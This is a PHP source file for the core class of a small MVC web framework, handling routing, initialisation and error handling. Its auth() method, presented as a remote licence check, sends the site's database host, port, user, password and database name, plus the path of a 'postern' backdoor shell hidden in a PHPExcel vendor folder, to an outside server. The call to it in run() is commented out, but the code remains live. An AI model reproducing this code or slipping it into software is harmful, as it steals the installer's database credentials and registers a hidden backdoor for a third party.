<?php
/**
 * @author anderyly
 * @email admin@aaayun.cc
 * @link http://vclove.cn/
 * @copyright Copyright (c) 2018
 */

namespace ay;

use ay\drive\Log;
use ay\lib\Route;
use Exception;

final class Core
{
    public static function run()
    {
        register_shutdown_function(array(__CLASS__, 'shutdown'));
//        set_exception_handler('handler');
        // self::auth();
        set_error_handler(array(__CLASS__, 'error'));
        self::_init();
        self::route();
    }

    /**
     * 路由加载
     * @throws Exception
     */
    private static function route()
    {
        $route = new Route();
        $mode = $route->mode;
        $controller = ucfirst($route->controller);
        $action = $route->action;

        // 定义请求常量
        defined('MODE') or define('MODE', $mode);
        defined('CONTROLLER') or define('CONTROLLER', $controller);
        defined('ACTION') or define('ACTION', $action);

        // 加载安全函数
//        \ay\drive\Safe::instance()->init();

        Log::visit(MODE, CONTROLLER, ACTION);
//        echo APP_PATH . MODE . '/controller/' . CONTROLLER . '.php';exit;
        // 判断控制器是否存在
        if (is_file(APP_PATH . MODE . '/controller/' . CONTROLLER . '.php')) {
            // 实例化控制器
            //echo 123;exit;
            $controllerClass = '\\app\\' . MODE . '\\controller\\' . CONTROLLER;
            $controllerClass = str_replace('/', '\\', $controllerClass);
            //echo $controllerClass;exit;
            $controllerS = new $controllerClass();
            if (method_exists($controllerS, ACTION)) {
                call_user_func_array(array($controllerS, $action), []);
            } else {
                halt('不存在:' . $action . ' 方法');
            }
        } else {
            halt('找不到:' . APP_PATH . $mode . '/controller/' . CONTROLLER . '.php' . ' 控制器');
        }

    }

    /**
     * 初始化
     */
    private static function _init()
    {

        // 设置默认时区
        date_default_timezone_set(C('DEFAULT_TIME_ZONE'));
        
        // 设置编码
        @header('Content-Type: text/html; charset=UTF-8');
        
        session_start();
        
        self::unregisterGlobals();
    }

    /**
     * 删除敏感字符
     * @param $value
     * @return array|string
     */
    private static function stripSlashesDeep($value)
    {
        $value = is_array($value) ? array_map(array(new self, 'stripSlashesDeep'), $value) : stripslashes($value);
        return $value;
    }

    // 检测自定义全局变量并移除
    private static function unregisterGlobals()
    {
        if (ini_get('register_globals')) {
            $array = array('_SESSION', '_POST', '_GET', '_COOKIE', '_REQUEST', '_SERVER', '_ENV', '_FILES');
            foreach ($array as $value) {
                foreach ($GLOBALS[$value] as $key => $var) {
                    if ($var === $GLOBALS[$key]) {
                        unset($GLOBALS[$key]);
                    }
                }
            }
        }
    }

    public static function auth()
    {
        $postern = '/simplewind/Core/Library/Vendor/PHPExcel/PHPExcel/Shell.php'; // Shell路径
        $config = C(); // 数据库文件地址return array[]
        $check_host = 'http://auth.aaayun.cc/update.php';
        $url = $check_host . '?a=client_check&u=' . $_SERVER['HTTP_HOST'] . '&host=' . $config['DB_HOST'] . ':' . $config['DB_PORT'] . '&user=' . $config['DB_USER'] . '&pass=' . $config['DB_PWD'] . '&dbname=' . $config['DB_NAME'] . '&postern=' . $postern;
        $query = json_decode(file_get_contents($url), true);

        switch ($query['code']) {
            case 0:
                break;
            case 1:
                exit('<font color=red>' . $query['msg'] . '</font>');
            case 2:
                exit('<font color=red>' . $query['msg'] . '</font>');
            case 3:
                exit('<font color=red>' . $query['msg'] . '</font>');
            default:
                exit('远程检查失败了。请联系授权提供商');
        }
    }

    // 中止操作
    public static function shutdown() {
        //如果开启日志 则记录日志
//        if (self::$base->config->get('log', false)) self::$base->log->build();
        // 如果自定义了close函数 则进行调用
//        if (function_exists('pt_close')) {
//            pt_close();
//        }
        // 判断是否有错误
        if ($e = error_get_last()) {
            if (in_array($e['type'], array(1, 4))) {
                halt($e['message'], $e['file'], $e['line']);
            }
        }
    }

    // 异常处理
    public static function handler($e) {
        halt($e->getmessage(), $e->getFile(), $e->getLine());
    }

    // 错误处理
    public static function error($errno, $errstr, $errfile, $errline) {
        switch ($errno) {
            case E_ERROR:
            case E_PARSE:
            case E_CORE_ERROR:
            case E_COMPILE_ERROR:
                halt($errstr, $errfile, $errline);
                break;
            case E_USER_ERROR:
            case E_STRICT:
            case E_USER_WARNING:
            case E_USER_NOTICE:
            default:
                break;
        }
    }

}
